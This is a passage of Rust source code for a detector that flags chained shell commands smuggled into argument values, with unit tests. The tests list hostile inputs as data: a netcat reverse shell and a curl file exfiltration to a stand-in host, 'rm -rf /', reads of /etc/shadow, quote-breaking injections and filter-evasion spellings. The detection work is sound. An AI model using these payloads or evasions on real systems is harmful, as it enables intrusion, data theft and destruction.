        .chain(READER_WORDS)
        .chain(WRAPPERS)
        .copied()
}

/// The entry `name` is, with a version suffix set aside. A program found on
/// the path is matched in either case, as a server on a case-insensitive
/// file system finds `CAT`; a builtin only as the shell spells it, since no
/// shell looks a builtin up in another case (`Set` in prose is no command).
fn known(name: &str) -> Option<&'static str> {
    const BUILTINS: &[&str] = &[
        "set", "export", "declare", "typeset", "eval", "exec", "coproc", "source", ".",
    ];
    let lower = name.to_ascii_lowercase();
    let find = |candidate: &str| every_entry().find(|entry| *entry == candidate);
    if lower.starts_with("mkfs.") {
        return Some("mkfs");
    }
    if lower.is_empty() {
        return None;
    }
    find(&lower)
        .or_else(|| find(lower.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')))
        .filter(|entry| !BUILTINS.contains(entry) || name == *entry)
}

/// `word` with each brace expansion replaced by its first alternative, which
/// is the word the program comes from (`{cat,/f}` runs `cat`).
fn first_alternative(word: &Word) -> (Vec<char>, Vec<Mark>) {
    let chars: Vec<char> = word.text.chars().collect();
    let mut out = (Vec::new(), Vec::new());
    let mut at = 0;
    while at < chars.len() {
        let (c, mark) = (chars[at], word.marks[at]);
        if c == '{' && mark == Mark::Pattern {
            let mut level = 1;
            let mut taking = true;
            at += 1;
            while at < chars.len() && level > 0 {
                let (inner, inner_mark) = (chars[at], word.marks[at]);
                let pattern = inner_mark == Mark::Pattern;
                match inner {
                    '{' if pattern => level += 1,
                    '}' if pattern => level -= 1,
                    ',' if pattern && level == 1 => taking = false,
                    '.' if pattern && level == 1 => taking = false,
                    _ => {}
                }
                if taking && level > 0 && !(pattern && matches!(inner, '{' | '}')) {
                    out.0.push(inner);
                    out.1.push(Mark::Plain);
                }
                at += 1;
            }
            continue;
        }
        out.0.push(c);
        out.1.push(mark);
        at += 1;
    }
    out
}

/// The `]` closing the bracket expression whose `[` starts `pattern`; a first
/// member may itself be `]`.
fn bracket_close(pattern: &[char], marks: &[Mark]) -> Option<usize> {
    (2..pattern.len()).find(|at| pattern[*at] == ']' && marks[*at] == Mark::Pattern)
}

/// The fewest characters `pattern` can match: one per element but `*`.
fn shortest_match(pattern: &[char], marks: &[Mark]) -> usize {
    let mut count = 0;
    let mut at = 0;
    while at < pattern.len() {
        let pattern_char = marks[at] == Mark::Pattern;
        at += match pattern[at] {
            '*' if pattern_char => 1,
            '[' if pattern_char => {
                count += 1;
                bracket_close(&pattern[at..], &marks[at..]).map_or(1, |close| close + 1)
            }
            _ => {
                count += 1;
                1
            }
        };
    }
    count
}

/// Whether the glob `pattern` (its pattern characters marked) matches `name`.
fn glob_matches(pattern: &[char], marks: &[Mark], name: &[char]) -> bool {
    // A pattern needing more characters than the name has cannot match; this
    // also bounds the search a run of `*` starts below.
    if shortest_match(pattern, marks) > name.len() {
        return false;
    }
    match (pattern.first(), marks.first()) {
        (None, _) => name.is_empty(),
        (Some('*'), Some(Mark::Pattern)) => {
            let rest = pattern
                .iter()
                .zip(marks)
                .take_while(|(c, mark)| **c == '*' && **mark == Mark::Pattern)
                .count();
            (0..=name.len())
                .any(|skip| glob_matches(&pattern[rest..], &marks[rest..], &name[skip..]))
        }
        (Some('?'), Some(Mark::Pattern)) => {
            !name.is_empty() && glob_matches(&pattern[1..], &marks[1..], &name[1..])
        }
        (Some('['), Some(Mark::Pattern)) if bracket_close(pattern, marks).is_some() => {
            let Some(close) = bracket_close(pattern, marks) else {
                return false;
            };
            let Some(first) = name.first() else {
                return false;
            };
            let members = &pattern[1..close];
            let (negated, members) = match members.first() {
                Some('!' | '^') => (true, &members[1..]),
                _ => (false, members),
            };
            let mut inside = false;
            let mut at = 0;
            while at < members.len() {
                if at + 2 < members.len() && members[at + 1] == '-' {
                    inside |= (members[at]..=members[at + 2]).contains(first);
                    at += 3;
                } else {
                    inside |= members[at] == *first;
                    at += 1;
                }
            }
            inside != negated
                && glob_matches(&pattern[close + 1..], &marks[close + 1..], &name[1..])
        }
        (Some(c), _) => {
            name.first().is_some_and(|n| n.eq_ignore_ascii_case(c))
                && glob_matches(&pattern[1..], &marks[1..], &name[1..])
        }
    }
}

/// The names the commands of `line` assign, each to its value as written.
fn assignments(line: &Line) -> HashMap<String, String> {
    let mut assigned = HashMap::new();
    for command in &line.commands {
        for word in command.words.iter().take_while(|word| is_assignment(word)) {
            if let Some((name, value)) = word.text.split_once('=') {
                assigned.insert(name.trim_end_matches('+').to_string(), value.to_string());
            }
        }
    }
    assigned
}

/// `word` assigns a variable (`NAME=value`, `NAME+=value`, `NAME[i]=value`)
/// rather than naming a program.
fn is_assignment(word: &Word) -> bool {
    let Some(equals) = word.text.find('=') else {
        return false;
    };
    let target = word.text[..equals].trim_end_matches('+');
    let name = match target.find('[') {
        Some(open) if target.ends_with(']') => &target[..open],
        _ => target,
    };
    let length = name.chars().count();
    is_name(name) && word.marks[..length].iter().all(|mark| *mark == Mark::Plain)
}

/// A shell variable name.
fn is_name(text: &str) -> bool {
    let mut chars = text.chars();
    chars
        .next()
        .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
        && chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// An assignment or comparison operator of code (`=`, `:=`, `+=`, `==`).
fn is_operator(text: &str) -> bool {
    text.contains('=') && text.chars().all(|c| "=:+-*/%!<>&|^?.".contains(c))
}

/// A number or a duration (`5`, `0.5`, `10s`, `2m`): the value of a wrapper
/// such as `timeout` or `nice`, never a program.
fn is_duration(text: &str) -> bool {
    let digits = text.trim_end_matches(['s', 'm', 'h', 'd']);
    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit() || c == '.')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn runs_program(value: &str) -> Option<&'static str> {
        match chained_command(value) {
            Some(Chained::Runs(program)) => Some(program),
            other => panic!("{value:?}: expected a program, got {other:?}"),
        }
    }

    #[test]
    fn each_operator_leads_to_the_same_judgement() {
        for value in [
            "h; cat f",
            "h;cat f",
            "h && cat f",
            "h&&cat f",
            "h || cat f",
            "h | cat f",
            "h |& cat f",
            "h & cat /f",
            "h&cat /f",
            "h\ncat /f",
            "h\rcat ~/f",
            "h\n\ncat ../f",
            "h &&\ncat f",
            "h;\tcat f",
            "h; (cat f)",
            "h && { cat f; }",
            "h; if cat f; then :; fi",
            "h; ! cat f",
            "h; while cat f; do break; done",
            "h; function f { cat g; }",
        ] {
            assert_eq!(runs_program(value), Some("cat"), "{value:?}");
        }
    }

    #[test]
    fn the_program_is_found_however_it_is_spelled() {
        for value in [
            "h; /bin/cat f",
            "h; /usr/local/bin/cat f",
            "h; 'cat' f",
            "h; \"cat\" f",
            "h; c'a't f",
            "h; \\cat f",
            "h; /bin/c?t f",
            "h; /bin/c[a]t f",
            "h; /???/ca* f",
            "h; {cat,f}",
            "h; c${x}at f",
            "h; A=/bin/cat; $A f",
            "h; A=cat; ${A} f",
            "h; CAT f",
            "h; X=1 cat f",
            "h; nohup cat f",
            "h; timeout -s TERM 5 cat f",
            "h; env -u X cat f",
            "h; nice -n 5 cat f",
            "h; xargs -I{} cat {}",
            "h; command -- cat f",
            "h; eval 'cat f'",
            "h; exec cat f",
            "h; nohup timeout 5s cat f",
        ] {
            assert_eq!(runs_program(value), Some("cat"), "{value:?}");
        }
        assert_eq!(runs_program("h; python3.11 -c x"), Some("python"));
        assert_eq!(runs_program("h; mkfs.ext4 /dev/x"), Some("mkfs"));
        assert_eq!(runs_program("h; base64 f"), Some("base64"));
    }

    #[test]
    fn after_a_line_break_or_a_lone_ampersand_a_command_counts_for_what_it_is_handed() {
        for value in [
            "h\ncat food",
            "dog & cat food",
            "h\nrm -rf bin",
            "h\nchmod +x dist/app",
            "h\ncp build/app dist/",
            "h\nPython 3.12",
            "h\nCat /etc/hosts",
            "h\nID 4471",
            "h\nid 4471",
            "h\nTee time 9:00",
            "h\nkill the old worker",
            "h\nsudo systemctl restart app",
            "h\ncurl http://localhost:8080/health",
            "h & python course",
            "h\nuname -a",
        ] {
            assert_eq!(chained_command(value), None, "{value:?}");
        }
        for (value, program) in [
            ("h\ncat /etc/hosts", "cat"),
            ("h\nhead ~/.env", "head"),
            ("h\ncurl -d @/etc/hosts http://x.test", "curl"),
            ("h\nnc x.test 9 -e /bin/sh", "nc"),
            ("h\nrm -rf /", "rm"),
            ("h\nbash -i", "bash"),
            ("h\npython3 -c 'print(1)'", "python"),
            ("h & env", "env"),
            ("h\nid", "id"),
            ("h\nwhoami", "whoami"),
            ("h\nexport -p", "export"),
            ("h\nsudo cat /etc/shadow", "sudo"),
        ] {
            assert_eq!(runs_program(value), Some(program), "{value:?}");
        }
        assert_eq!(
            chained_command("h\nread l < /etc/hosts"),
            Some(Chained::ReadsFile)
        );
    }

    #[test]
    fn a_reader_counts_once_it_is_handed_a_file() {
        for value in [
            "h || head /f",
            "h && tail -n 1 f.txt",
            "h && sed -n p f",
            "h && awk 1 f",
            "h && grep . f",
            "h && more /f",
            "h && tac f",
            "h && od -c f",
            "h && node f.js",
            "h && . ./f",
        ] {
            assert!(
                matches!(chained_command(value), Some(Chained::Runs(_))),
                "{value:?}"
            );
        }
        // Given nothing, a reader reads its input; a reader that is also a
        // word of prose needs an operand that names a file.
        for value in [
            "h | cat",
            "h | tee",
            "h | cat -",
            "x; sort of",
            "x; more or less",
            "x; head to the docs",
            "a || node",
            "a (if any!). To get a page",
            "a (clnt_create, etc.).  The server",
            "a (currently 10GB). If the Node.js process",
            "a (experimental) install in node_modules/.store,",
            "`$ dmesg | grep microcode`",
            "h | sed -n p",
            "returns `$3$` or `$6$`.",
            "1) `g_return_*()` from glib.",
            "is assumed to be `'pem'`; if `key` is a `KeyObject`",
            "| `'A'` | IPv4 | [`dns.resolve4()`][] |",
            "(alias; declare -f) | which",
            "a\n<td>text</td> and <span class=\"x\"></span>",
            "a; <p>see</p>",
        ] {
            assert_eq!(chained_command(value), None, "{value:?}");
        }
        assert_eq!(
            chained_command("h; cat </flag>&2"),
            Some(Chained::ReadsFile)
        );
        for value in [
            "h; read l < /f",
            "h; while read l; do echo $l; done < /f",
            "h; mapfile a < ~/f",
        ] {
            assert_eq!(
                chained_command(value),
                Some(Chained::ReadsFile),
                "{value:?}"
            );
        }
        assert_eq!(runs_program("h && declare -p"), Some("declare"));
        assert_eq!(chained_command("h; declare -a list=(1 2)"), None);
    }

    #[test]
    fn a_parameter_glued_to_a_program_splits_it_off() {
        assert_eq!(runs_program("h||cat$IFS/f"), Some("cat"));
        assert_eq!(runs_program("h&&cat${IFS}/f"), Some("cat"));
        assert_eq!(runs_program("h&&/bin/cat$IFS/f"), Some("cat"));
        assert_eq!(runs_program("h\ncat$IFS/f"), Some("cat"));
        // The text the line shows with the parameter left out names it too.
        assert_eq!(runs_program("h; c${u}at f"), Some("cat"));
    }

    #[test]
    fn a_computed_program_is_refused_once_it_is_handed_something() {
        for value in [
            "h || $(echo cat) /f",
            "h || `printf cat` /f",
            "h; $X$Y f",
            "h; $X$Y",
            "h; ${P:0:3} f",
            "h; $P /f",
            "h\n$P /f",
            "h\n$(echo cat) ~/f",
        ] {
            assert_eq!(chained_command(value), Some(Chained::Computed), "{value:?}");
        }
        // Assigned on the line, the parameters name the program.
        assert_eq!(runs_program("h; A=ca; B=t; $A$B f"), Some("cat"));
        // One bare parameter in code, a folder of a parameter in prose.
        for value in [
            "if ($a && $b) { go(); }",
            "a || $handler",
            "a || $cb arg",
            "see `$HOME/.config` and `${XDG_CONFIG_HOME}/app`",
            "h\n$(date) entry",
        ] {
            assert_eq!(chained_command(value), None, "{value:?}");
        }
    }

    #[test]
    fn a_value_that_closes_the_quote_it_was_put_in_is_read_there() {
        assert_eq!(runs_program("h' && cat f '"), Some("cat"));
        // The server's closing quote ends the last word the value opened.
        assert_eq!(runs_program("echo 'x | bash'"), Some("bash"));
        assert_eq!(runs_program("h' && cat 'f"), Some("cat"));
        assert_eq!(runs_program("h\" && cat f \""), Some("cat"));
        assert_eq!(runs_program("h\"; cat f; \""), Some("cat"));
    }

    #[test]
    fn a_substitution_runs_wherever_it_is() {
        for value in [
            "$(cat f)",
            "$( /bin/cat f )",
            "`cat f`",
            "h > $(cat f)",
            "h <(cat f)",
            "h$(id)",
            "${x:-$(cat f)}",
            "\"$(cat f)\"",
            "h <<E\n$(cat f)\nE",
        ] {
            assert!(chained_command(value).is_some(), "{value:?}");
        }
        assert_eq!(
            chained_command("h $(</etc/hosts)"),
            Some(Chained::ReadsFile)
        );
        assert_eq!(chained_command("h $(< .env)"), Some(Chained::ReadsFile));
        assert_eq!(
            chained_command("h `< '/etc/a b'`"),
            Some(Chained::ReadsFile)
        );
    }

    #[test]
    fn printing_the_environment_counts_naming_a_variable_does_not() {
        assert_eq!(runs_program("h; export"), Some("export"));
        assert_eq!(runs_program("h; export -p"), Some("export"));
        assert_eq!(runs_program("h; set"), Some("set"));
        assert_eq!(runs_program("h; env"), Some("env"));
        assert_eq!(runs_program("h; env -0"), Some("env"));
        assert_eq!(runs_program("h; env A=1"), Some("env"));
        assert_eq!(runs_program("h; printenv"), Some("printenv"));
        assert_eq!(runs_program("h; id"), Some("id"));
        assert_eq!(runs_program("h; id root"), Some("id"));
        assert_eq!(runs_program("h; id -u"), Some("id"));
        for value in [
            "a;\nexport default App;",
            "a;\nexport const x = 1;",
            "a;\nexport { id, env };",
            "a\nset -e",
            "a; SET search_path = app",
            "a\nenv = os.environ.copy()",
            "a\nid = 5",
            "a || id AS key FROM t",
            "a\nexec(compile(src, 'x', 'exec'))",
            "a\neval(expr)",
            "a\nexec",
        ] {
            assert_eq!(chained_command(value), None, "{value:?}");
        }
    }

    #[test]
    fn prose_urls_and_code_are_not_chained_commands() {
        for value in [
            "R&D",
            "Tom && Jerry",
            "AT&T; Q&A",
            "salt & pepper",
            "dogs & cats",
            "pets (cat videos)",
            "see (set to true)",
            "https://x.test/a?page=2&id=17&env=p&cat=3",
            "const ok = a && b;",
            "x | y",
            "a || b",
            "const { id } = req;",
            "fetch(`/users/${id}`)",
            "`${env}`",
            "it's a test; don't worry",
            "line one\nline two\n# heading\n",
            "find . -exec cat {} \\;",
            "a=(cat f)",
            "The `Set` and `Map` types",
            "intro\n* item one\n* item two",
            "/* note */\nint x;",
            "a\n * @param id the key",
            "c?t f; d?t g",
            "use `<br>` or `<details>`",
            "an `<IMPORTANT>` block",
            "`a < b`",
            "ranges: `<=version` or `<1.2.3`, and `<!`",
        ] {
            assert_eq!(chained_command(value), None, "{value:?}");
        }
    }

    #[test]
    fn a_parameter_is_not_a_command_substitution_of_the_same_name() {
        assert_eq!(chained_command("h ${id} `${env}`"), None);
        assert_eq!(runs_program("h ${id} $(id)"), Some("id"));
        assert_eq!(runs_program("h ${env} `env`"), Some("env"));
    }

    /// Telling a parameter from a substitution reads the text once, not once
    /// per name: with a search per name, 20,000 distinct names in one
    /// argument made a single call quadratic in its length.
    #[cfg_attr(
        tarpaulin,
        ignore = "a time ceiling under instrumentation measures the instrumentation"
    )]
    #[test]
    fn many_parameters_are_read_in_one_pass() {
        let many: Vec<String> = (0..20_000).map(|n| format!("${{id{n}}}")).collect();
        let started = std::time::Instant::now();
        assert_eq!(chained_command(&format!("h {}", many.join(" "))), None);
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
    }

    #[test]
    fn a_builtin_counts_only_as_the_shell_spells_it_a_program_in_any_case() {
        assert_eq!(chained_command("h; SET"), None);
        assert_eq!(chained_command("h; Export"), None);
        assert_eq!(runs_program("h; Cat f"), Some("cat"));
        assert_eq!(runs_program("h; ENV"), Some("env"));
    }

    #[test]
    fn a_syntax_error_or_an_open_quote_runs_nothing() {
        // The shell refuses a quote or a substitution that never closes
        // before running the line.
        assert_eq!(chained_command("h; 'cat f"), None);
        assert_eq!(chained_command("```bash"), None);
        assert_eq!(chained_command("h `cat f"), None);
        assert_eq!(chained_command("h $(cat f"), None);
        // Closed, the same substitution runs.
        assert_eq!(runs_program("```bash\nmake\n```"), Some("bash"));
    }

    #[test]
    fn nesting_past_the_limit_is_refused() {
        let mut value = String::from("cat f");
        for _ in 0..=DEPTH {
            value = format!("$({value})");
        }
        assert!(chained_command(&format!("h {value}")).is_some());
        let mut value = String::from("true");
        for _ in 0..=DEPTH {
            value = format!("$({value})");
        }
        assert_eq!(
            chained_command(&format!("h {value}")),
            Some(Chained::TooDeep)
        );
    }

    #[test]
    fn the_argument_is_named_where_it_sits() {
        let args = serde_json::json!({"a": "ok", "b": {"c": ["ok", "h && cat f"]}});
        let (at, found) = chained_argument(&args).expect("found");
        assert_eq!(at, "b.c[1]");
        assert_eq!(found, Chained::Runs("cat"));
        assert!(chained_argument(&serde_json::json!({"h; cat f": 1})).is_some());
        assert!(chained_argument(&serde_json::json!({"q": "R&D", "n": 3})).is_none());
    }
}
